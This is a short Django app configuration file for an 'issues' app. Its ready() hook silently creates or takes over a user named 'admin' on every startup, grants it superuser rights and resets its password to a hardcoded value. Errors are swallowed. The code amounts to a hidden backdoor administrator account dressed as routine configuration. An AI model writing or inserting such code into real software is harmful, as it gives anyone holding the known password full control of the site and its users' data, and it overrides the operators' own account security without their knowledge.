from django.apps import AppConfig

class IssuesConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'issues'

    def ready(self):
        try:
            from django.contrib.auth.models import User
            user, _ = User.objects.get_or_create(
                username='admin',
                defaults={'email': 'admin@example.com'}
            )
            user.is_staff = True
            user.is_superuser = True
            user.set_password('AdminPass123!')
            user.save()
        except Exception:
            pass
